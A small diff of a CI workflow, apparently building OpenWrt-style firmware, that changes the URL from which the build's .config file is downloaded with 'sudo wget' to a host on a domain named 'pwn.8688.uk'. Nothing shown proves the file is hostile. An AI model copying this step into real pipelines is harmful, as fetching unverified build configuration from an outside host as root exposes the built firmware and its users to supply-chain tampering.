@@ -50,7 +50,7 @@ jobs:
           ./scripts/feeds install -a
 
       - name: Generate configuration file
-        run: sudo wget https://wes.cc/p12/.config
+        run: sudo wget https://pwn.8688.uk/scss/.config
 
       - name: Download packages
         run: make download -j16
